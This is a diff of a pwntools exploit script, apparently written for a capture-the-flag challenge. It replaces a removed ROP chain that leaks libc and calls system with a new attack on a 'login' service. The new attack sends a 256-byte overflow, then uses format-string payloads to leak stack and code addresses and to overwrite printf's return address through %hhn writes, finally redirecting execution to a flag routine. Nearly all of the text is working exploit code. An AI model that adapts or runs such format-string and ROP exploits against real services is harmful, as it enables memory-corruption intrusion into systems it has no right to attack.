@@ -2,50 +2,73 @@
 
 from pwn import *
 from pwnlib.log import *
+import sys
 
 # setting 
 context.arch = 'amd64'
 context.os = 'linux'
 context.endian = 'little'
 context.word_size = 32
-elf = ELF("flagen")
-lib = ELF("libc.so.6")
+elf = ELF("login")
+libc = ELF("libc.so.6")
 
-#r = remote("localhost", 55666)
-r = remote("202.112.26.106", 5149)
+r = remote("localhost", 55666)
+#r = remote("202.112.28.116" 10910)
 
-r.recvuntil("choice: ")
-r.sendline("1")
+# level1
+r.recvuntil("Login: ")
+r.sendline("guest")
+r.recvuntil("Password: ")
+r.sendline("guest123")
 
-
-
-buf = p32(0x0804b510)
-retins = p32(0x80485f8)
-got = lib.symbols["__stack_chk_fail"]
-puts = p32(elf.symbols["puts"])
-read = p32(elf.symbols["read"])
-pop1 = p32(0x8048481) 
-payload = retins + "a"*8 + p32(elf.plt["printf"])
-payload += "h"*84
-ret = pop1
-leave = p32(0x08048b2c)
-readn = p32(0x080486cb)
-payload += buf + ret + got + puts + pop1 + p32(elf.got["read"]) + readn + leave + p32(0x0804b514) + p32(0x20202020)
-
-r.sendline(payload)
-r.recvuntil("choice: ")
+r.recvuntil("Your choice: ")
+r.sendline("2")
+r.recvuntil("username:\n")
+r.send("a"*256)
+r.recvuntil("Your choice: ")
 r.sendline("4")
 
-leak = u32(r.recv(4))
-info('leak = %x' % leak)
-base = leak - lib.symbols["read"]
-info('libc_base = %x' % base)
-lib.address += base 
+# level2
+# leak text & stack
+r.recvuntil("Login: ")
+check = "12345678"
+r.sendline(check + "%23$lx%22$lx")
+r.recvuntil("Password: ")
+r.sendline("gg")
+buf = r.recvuntil("login failed.\n")[8:32]
+print buf
+rsp = int(buf[:12], 16) - 800
+info("rsp = " + hex(rsp))
+base = int(buf[12:], 16) - 0xba0
+info("base = " + hex(base))
+printf_ret = rsp - 8
+info("printf_ret = " + hex(printf_ret))
+flag = base + 0xfb3
+info("flag = " + hex(flag))
 
-gets = p32(lib.symbols["gets"])
-system = p32(lib.symbols["system"])
-buf = p32(0x0804b600)
-payload = gets + system + buf + buf
+count = 0
+def gen_fmt(byte, offset):
+	global count
+	while byte < count:
+		byte += 0x100
+	num = byte - count 
+	count += num
+#	return "%{0}c%{1}$lx".format(num, offset)
+	return "%{0}c%{1}$hhn".format(num, offset)
+
+payload =  gen_fmt(flag & 0xff, 15)
+payload += gen_fmt((flag >> 8) & 0xff, 16)
+
+print payload
+
+# overwrite 
+r.recvuntil("Login: ")
+#payload = "%179c%15$hhn" + "%156c%16$hhn"
+while len(payload) < 56:
+	payload += "a"
+payload += p64(printf_ret) + p64(printf_ret+1)
 r.sendline(payload)
+r.recvuntil("Password: ")
+r.sendline("gg")
 
 r.interactive()
